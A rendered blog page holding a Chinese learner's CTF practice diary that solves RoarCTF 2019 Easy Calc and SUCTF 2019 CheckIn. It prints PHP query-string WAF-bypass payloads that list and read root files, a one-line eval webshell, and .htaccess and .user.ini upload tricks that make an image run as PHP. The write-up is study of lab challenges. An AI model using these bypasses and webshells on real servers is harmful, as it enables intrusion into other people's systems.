@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="liduoan.efls">
+    
+    <title>
+        
+            四月份安全-2 |
+        
+        liduoan修炼笔记
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","favicon":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","avatar":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","font_size":null,"font_family":"STSong","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"世之奇伟、瑰怪，非常之观，常在于险远 || 而人之所罕至焉，故非有志者不能至也","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               liduoan修炼笔记
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">四月份安全-2</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">liduoan.efls</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2020-04-08 07:28:58</span>
+        <span class="mobile">2020-04-08 07:28</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2020-04-16 22:14:33</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%88%B7%E9%A2%98/">刷题</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>6 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="2020-04-07"><a href="#2020-04-07" class="headerlink" title="2020.04.07"></a>2020.04.07</h2><p>今天是因为身体不行了，然后有学了两个小时的php开发。</p>
+<p>所以没多少时间写了。。</p>
+<p>明天补上！</p>
+<h2 id="2020-04-08"><a href="#2020-04-08" class="headerlink" title="2020.04.08"></a>2020.04.08</h2><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>首先直接进去后。</p>
+<p>查看源码：有注释你不是admin用户</p>
+<p>说明如果是admin用户就可以得到flag了</p>
+<p>然后注册登陆。可以看到有一个注释，是源码的地址。</p>
+<p>然后我就不会了</p>
+<p>他是python的flask的漏洞和源码审计。。</p>
+<p>还有seeesion的问题。是个可以被解密的签证。</p>
+<p>我傻了。留着吧。 </p>
+<p>主要参考：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11722351.html" >https://www.cnblogs.com/chrysanthemum/p/11722351.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3569#toc-0" >https://xz.aliyun.com/t/3569#toc-0<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html" >https://www.leavesongs.com/PENETRATION/client-session-security.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://cizixs.com/2017/03/08/flask-insight-session/" >https://cizixs.com/2017/03/08/flask-insight-session/<i class="fas fa-external-link-alt"></i></a></p>
+<span id="more"></span>
+
+<h2 id="2020-04-09"><a href="#2020-04-09" class="headerlink" title="2020.04.09"></a>2020.04.09</h2><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>这道题目有趣多了</p>
+<p>学到的知识点</p>
+<p>1、如果我们的单引号和双引号被过滤了</p>
+<p>我们怎么输入字符串？</p>
+<p>​	1）、<code>chr()</code></p>
+<p>​			<code>chr ( int $ascii) : string</code>:返回指定的字符</p>
+<p>​	2）、<code>hex2bin ( string $data ) : string</code></p>
+<p>​			：把十六进制字符串转化为二进制字符串</p>
+<p>​			<code>dechex ( int $number) : string</code>	</p>
+<p>​			：十进制数字转化为十六进制字符串</p>
+<p>2、如何查看当前目录下有什么。除了直接使用<code>system()</code></p>
+<p>​		<code>scandir ( string $directory [, int $sorting_order [, resource $context ]] ) : array</code></p>
+<p>​		返回一个数组。数组里包含<code>directory</code>中的文件和目录</p>
+<p>3、PHP字符串解析</p>
+<p>​		</p>
+<p><strong>字符串解析</strong></p>
+<p>PHP查询字符串（在URL或正文中）转化为内部<code>$_GET</code>或<code>$_POST</code>数组时，例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
+<p><code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code></p>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
+<p>1.删除空白符</p>
+<p>2.将某些字符转换为下划线（包括空格）</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img-blog.csdnimg.cn/20200408085244645.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
+                     
+                ></p>
+<p>这也是为什么上一篇有一道题目</p>
+<p>他过滤了下划线，而变量名字为<code>b_u_r_p</code></p>
+<p>我们可以利用 <code>b%20u%20r%20p</code>来成功输入变量</p>
+<p>好了基本知识点都知道了</p>
+<p>我们来解解题目</p>
+<p>测试发现，输入只能是数字和特殊字符，不允许使用字母</p>
+<p>这里就是利用PHP字符串解析了。</p>
+<p>假如waf不允许num变量传递字母：</p>
+<p><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</code><br>那么我们可以在num前加个空格：</p>
+<p><code>http://www.xxx.com/index.php? num = aaaa</code><br>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。</p>
+<p>但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p>至于是怎么发现是这个的。。。我哪知道啊。</p>
+<p>之后 我们审查一下calc.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看的出来，它过滤了<code> 空格   单引号   双引号  换行  [   ]   $  \  ^</code></p>
+<p>还好没有过滤<code> (   )</code>。那么我们可以利用很多了</p>
+<p>ascii码表查找：<a class="link"   target="_blank" rel="noopener" href="http://ascii.911cha.com/" >http://ascii.911cha.com/<i class="fas fa-external-link-alt"></i></a></p>
+<p>不就是不给直接输入字符串嘛！</p>
+<p>然后我尝试payload<code>?%20num=2;system(chr(108).chr(115))</code></p>
+<p>结果不能出来目录。还记得上次无参RCE使用的scandir()函数</p>
+<p>然后使用<code>?%20num=2;var_dump(scandir(chr(47)))</code>直接扫根目录</p>
+<p>一般flag都在根目录里面</p>
+<p>那么后面的操作就容易了</p>
+<p><code>?%20num=2;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code> </p>
+<p>不说了，另外一种http走私不会。。就这样，等刷完BUU我再刷第二遍的时候</p>
+<p>就精细一点。！</p>
+<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11757363.html" >https://www.cnblogs.com/chrysanthemum/p/11757363.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>参考里有很多的参考【？？套娃【笑   </p>
+<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>文件上传题目</p>
+<p>新的利用点 ——**.user.ini**</p>
+<p>整理下文件上传题的步骤：</p>
+<p>随意上传php</p>
+<p>fuzz后缀测试【可后面再做</p>
+<p>改未知扩展名如.aaa来判断是黑名单还是白名单</p>
+<p>之后再判断<code>&lt;?</code>问题</p>
+<p>再判断MIME问题</p>
+<p>文件头问题</p>
+<p>有一个经常可以通过的<code>&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;aaa&#39;]);&lt;scirpt&gt;</code></p>
+<p>黑名单过滤而且可以上传图片马，那我们首先想到的肯定是传一个.htaccess上去来将图片马解析为php</p>
+<p>这个方法是.htaccess文件内容为</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="type">FilesMatch</span> <span class="string">&quot;jpg&quot;</span>&gt; </span><br><span class="line">    <span class="type">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="type">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>除此之外还有一个<code>.user.ini</code>的方法</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://xzfile.aliyuncs.com/media/upload/picture/20190824211552-4c92f9fe-c671-1.png"
+                     
+                ></p>
+<p>也就是说我们可以在<code>.user.ini</code>中设置<code>php.ini</code>中<strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置，而且只要是在使用 <strong>CGI／FastCGI</strong> 模式的服务器上都可以使用<code>.user.ini</code></p>
+<p>在p牛的文章中提到了两个有趣的设置：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://xzfile.aliyuncs.com/media/upload/picture/20190824211604-538774ce-c671-1.png"
+                     
+                ></p>
+<p>大致意思就是：我们指定一个文件（如liduoan.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./liduoan.jpg);</code></p>
+<p>这两个设置的区别只是在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p>
+<p>那么我们在.user.ini文件中写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_preprnd_file=liduoan.jpg</span><br></pre></td></tr></table></figure>
+
+<p>这样，在我们访问某个php文件的时候，liduoan.jpg就会被插入在这个php文件前面。那么liduoan.jpg的php代码不就可以执行了？！</p>
+<p>好了，讲讲**.user.ini**的利用条件</p>
+<ul>
+<li>服务器脚本为PHP</li>
+<li>服务器使用CGI&#x2F;FastCGI模式</li>
+<li>上传目录下要有可执行的php文件</li>
+</ul>
+<p>优势： 和**.htaccess**后门比，范围更加广，nginx&#x2F;apache&#x2F;IIS都有效。而.htaccess只对apache有效</p>
+<p>注意和利用.htaccess的差别，在解题中最重要的是上传目录文件夹下有可执行的脚本。</p>
+<p><strong>具体解题步骤</strong></p>
+<p>上传.user.ini  liduoan.jpg文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img-blog.csdnimg.cn/20200408143113205.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
+                     
+                ></p>
+<p>之后蚁剑连接<code>/uploads/76d9f00467e5ee6abc3ca60892ef304e/index.php</code></p>
+<p>根目录查看flag 【全都是在根目录。。。</p>
+<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6091#toc-1" >https://xz.aliyun.com/t/6091#toc-1<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="2020-04-16"><a href="#2020-04-16" class="headerlink" title="2020.04.16"></a>2020.04.16</h2><h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3>
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">四月份安全-2</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">liduoan.efls</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2020-04-08 07:28:58</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2020/04/08/四月/四月份安全-2/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2020/04/08/CTFcomig/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%80%BB%E7%BB%931-0/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">命令执行-总结1.0</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2020/04/03/%E5%9B%9B%E6%9C%88/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">无参数RCE</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-04-07"><span class="nav-number">1.</span> <span class="nav-text">2020.04.07</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-04-08"><span class="nav-number">2.</span> <span class="nav-text">2020.04.08</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-number">3.</span> <span class="nav-text">[HCTF 2018]admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-04-09"><span class="nav-number">4.</span> <span class="nav-text">2020.04.09</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">5.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">5.1.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-04-16"><span class="nav-number">6.</span> <span class="nav-text">2020.04.16</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="nav-number">6.1.</span> <span class="nav-text">[极客大挑战 2019]RCE ME</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">liduoan.efls</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
